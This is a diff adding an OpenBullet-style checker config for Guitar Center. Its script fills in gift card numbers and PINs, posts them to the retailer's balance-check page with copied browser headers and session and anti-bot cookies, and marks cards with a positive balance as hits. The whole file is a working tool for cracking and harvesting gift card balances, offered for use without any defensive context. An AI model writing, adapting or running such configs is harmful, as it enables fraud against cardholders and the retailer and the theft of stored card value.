@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Guitarcenter",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-08T00:14:45.3476948-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "6134350877774185" -> CAP "CODE" 
+
+FUNCTION RandomString "53473051" -> CAP "PIN" 
+
+REQUEST POST "https://www.guitarcenter.com/Gift-Card/Balance.gc" 
+  CONTENT "giftCardNumber=<CODE>&pin=<PIN>&CheckBalance=Check+Balance" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.guitarcenter.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 71" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.guitarcenter.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.guitarcenter.com/Gift-Card/Balance.gc" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: CountryCode=US; CurrencyCode=USD; IdentifiedUser=false; JSESSIONID=xlJnpH1oEIVVGenigqPcMMYwolhHkkhSB6jH6n-6.atg10; MobileUser=false; richRelevanceSessionId=4419cd59c35e286b9164db6b5e9a19b5; src_code=GCDIRECTSOURCECODE1; AKA_A2=A; ak_bmsc=F62619C6810EF08F5EE5FED8ACFA649B173BFAF6D543000091DAB45EC0E4A426~pl9JO8wd0gP6evH6GfePklShCwrAyNAZAY0sbC9ihGPdyvSI8uDZm8hg4dagw/Z8iuUzGLeIg+J5fy3Ap1rqjR90jPzYpD7IxBsv10gmY9ELSTqlOObr5RmIgDcedtYgjFNQBMiAvtfiY/Hv8lLReDUMq6iASwfy68WrTMEFGCBld9mTuZRwcQ8Zq79pOjwgkbUjEl9uoMcqF71XKuGOCLZIMnrDzvvowX/QVlrt4XOQw=; bm_sz=F238A5C1A7278DFF27B3FEAD28D8D9BE~YAAQ9vo7F0SXMMBxAQAAdsd18gcv9JZcRHLEvRwnKqZIhMJL+ANArFNsIVCt+APgOvzDWfs8g576WJ503h0lNO31qJKMQTJzgBTuYYrWkMvFTgKT0M0AJz9wOhISfCJc86p7AZeLLz653CVHl+G2OCDY1aYuC8qjpI4gtGea3Mzcw+OGITnpL0cIUfcRtE1/LeWhbM7v; AMCVS_A67B776A5245B03F0A490D44%40AdobeOrg=1; check=true; mbox=session#005d61e7a9364b2fafa67ef72213fa79#1588912602; AMCV_A67B776A5245B03F0A490D44%40AdobeOrg=1075005958%7CMCIDTS%7C18391%7CMCMID%7C58217827805993247495529272950352937399%7CMCOPTOUT-1588917941s%7CNONE%7CvVersion%7C4.4.1; bm_sv=0472D4A2876A8655DAAD07B724309E48~AZOmJd14h/yUNnXM3oxJNag7p3S3jHJS7YVnT7nW4zFx4auQCOK9HO8k1ALONF4avOJjcWfNUUvTnmTn1ykvOv2l4dkiUAmuee6ji3humIt6IF2P6AF1DbcCqO/3deg1XyDJIt+Ee3WkT5kly60wZIWAkfBYSTluDz0q7QQwsU0=; _abck=1F5918B24BB7B5E7B460B23E55B43307~0~YAAQ9vo7F4aXMMBxAQAAodh18gPq7pMp+EqbCxmhmmfDSw71aDdA1MHm6AmbhiacS2a+fiBEnnSEJvvQfgu0xWSs/0r48iSeoFGyBsVvMhDmQA0m5X/JK18lzZ611M0rnuwjP49ORVaNxibBw65RZVqhPG1ORR3gxep0rB2YTHNLk/wFFwnMi4B5jilKTeHOrYPHKCqkRwW9hz10vFn82mHjt7gZSDy3fQkTjvRSLJ5PoHE2AzezM6XTTexoPhAP6rzbDw5GENgIL6vshXqcPfaOe5fbVTo5irtyekti4zuJiIqbO0kiN83eSgiAlu8IeESMvB39gzvJe+qxmw==~-1~-1~-1; rr_rcs=eF4NyrsNwCAMBcCGKrtY8gOM8QZZI_wkinRJ5o_b04Xj_p49GAmJILUaWHOM2UiUCOHt51o6J1x4eMpaLvJkVES6dmsJDT90oRFl" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Your Gift Certificate Balance is:" 
+  KEYCHAIN Failure OR 
+    KEY "The gift card number you entered is not found. Please check the gift card number and PIN" 
+
+PARSE "<SOURCE>" LR "<p>Your Gift Certificate Balance is:</p>" "lastChild" -> VAR "1" 
+
+PARSE "<1>" LR "<div>" "</div>" -> VAR "BAL" 
+
+FUNCTION Replace "CNY&nbsp;0.00" "" "<BAL>" -> CAP "BAL" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<BAL>" GreaterThan "0.00" 
+  KEYCHAIN Failure OR 
+    KEY "<BAL>" EqualTo "0.00" 
+
